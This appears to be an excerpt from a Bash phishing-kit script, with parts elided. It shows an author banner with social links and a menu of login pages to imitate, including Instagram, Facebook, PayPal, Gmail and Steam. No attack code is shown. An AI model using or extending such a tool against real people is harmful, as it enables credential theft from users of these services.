...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${CYAN}Cold Breazy
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Cold-Breazy
		${GREEN}Facebook ${RED}:  ${CYAN}Cold Breazy 
${GREEN}WA GROUP ${RED}:  ${CYAN}https://bit.ly/Join_our_whatsapp_group22
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${CYAN} Snapchat   ${RED}[${WHITE}02${RED}]${CYAN} Instagram
		${RED}[${WHITE}03${RED}]${CYAN} Kik        ${RED}[${WHITE}04${RED}]${CYAN} Facebook
		${RED}[${WHITE}05${RED}]${CYAN} Dropbox    ${RED}[${WHITE}06${RED}]${CYAN} PayPal
		${RED}[${WHITE}07${RED}]${CYAN} TikTok     ${RED}[${WHITE}08${RED}]${CYAN} Steam
		${RED}[${WHITE}09${RED}]${CYAN} Gmail      ${RED}[${WHITE}10${RED}]${CYAN} WhatsApp
